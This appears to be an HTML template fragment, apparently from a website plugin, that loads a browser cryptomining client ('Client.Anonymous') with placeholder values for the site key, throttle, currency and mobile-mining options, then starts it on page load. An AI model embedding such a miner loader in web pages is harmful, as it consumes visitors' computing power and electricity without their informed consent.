<script nonce="DyyDKGfdKxNrJflWqQOB5w\u003D\u003D" src="@Script"></script>
<script nonce="DyyDKGfdKxNrJflWqQOB5w\u003D\u003D">
    var @variable = new Client.Anonymous('@key', {
        throttle: @throt @currencymodifier @showAds
    });
    @stopmobilemining @variable.start();
</script>
